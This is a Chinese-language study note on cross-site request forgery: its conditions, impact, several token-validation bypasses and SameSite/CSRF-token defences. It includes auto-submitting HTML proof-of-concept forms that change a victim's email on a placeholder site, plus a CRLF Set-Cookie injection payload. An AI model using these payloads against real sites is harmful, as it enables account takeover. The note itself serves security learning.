# CSRF
## 成因
* 跨站請求偽造（也稱為 CSRF），攻擊者誘導用戶執行他們不打算執行的操作。
* CSRF 達成的 3 個條件:
    * **相關行動** : 有理由誘導的操作，ex. 更換密碼。
    * **基於 Cookie 的 session 處理** : 僅使用 cookie 來驗證身分，而沒有其他像是追蹤 session 狀態或對發起的請求驗證。
    * **沒有不可預知的請求參數** : 沒有其他需要附上的額外參數，ex.更改密碼，有時需要先輸入之前的密碼。
## 影響
* 偽造請求，取得資料、權限
## 攻擊方法
### 建構與傳送 form
* 透過 form 表單的方式，傳遞給使用者(誘導使用者瀏覽攻擊者的網站)，再讓使用者傳送。
```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
### 常見的 CSRF 漏洞
#### request method 驗證
* 有些系統僅驗證 POST 方法，因此我們可以嘗試更換請求方法，來達成攻擊。
```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="GET">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
#### csrf token 存在驗證
* 有些系統依照 token 是否存在來決定是否進行驗證，因此我們可以透過刪除 token，來達成攻擊。

#### csrf token 未綁定使用者
* 有些系統的 token 未綁定使用者，因此攻擊者可以登入系統，將自己的 token 加入表單，來達成攻擊。
```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="csrf" value="attacker_token" />
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
#### csrf token 未與 session 狀態綁定
* 有些系統雖然在 cookie 有加入 csrf token，但未合併到用來追蹤目前狀況的 session 中。
* 因此攻擊者可以透過登入系統，使用自己 cookie 的 csrf token 加入到使用者的 cookie 中 (前提是系統支援可設定使用者cookie)。
#### csrf token 直接複製 cookie token
* 有些系統，並不在 server 紀錄所發出去的 csrf token。而是將 cookie 中放入 csrf token，然後每個請求資料中的 csrf token 是直接複製 cookie 中的 token。驗證時僅檢查請求資料中的 csrf token 是否與 cookie 中相同。
* 因此在這邊，攻擊者不需要登入系統取得合法的 token ，可以自己創造 token (格式相同)。
* 這邊我們設定 csrf=fake 與 Set-Cookie:csrf=fake 設定相同值，來達成攻擊。
```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="csrf" value="fake" />
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit()">
    </body>
</html>
```
## 防禦方法
* 使用 CSRF token ，在每個請求中包含 CSRF token，CSRF token 由 server 端產生並存入 session 中，之後再放入回應傳送給 client，當 client 發送請求時，server 會去檢驗 token 的合法性。
* 使用 `SameSite` cookies，並且設為 `Strict`。
    * `SameSite` 設為 `Strict`，瀏覽器將不會在來自其他站點的任何請求中包含 cookie。但也許會破壞使用者體驗，假如使用者透過第3方軟體瀏覽，可能要再重新登入。
    * `SameSite` 屬性設置為 `Lax`，瀏覽器將在來自另一個站點的請求中包含 cookie，但前提是滿足兩個條件：
        * 該請求使用 GET 方法。使用其他方法(例如 POST)的請求將不包含 cookie。
        * 該請求來自用戶的最上層導覽，例如單擊鏈接。其他請求，例如由腳本發起的請求，將不包含 cookie。

---
###### tags: `web security`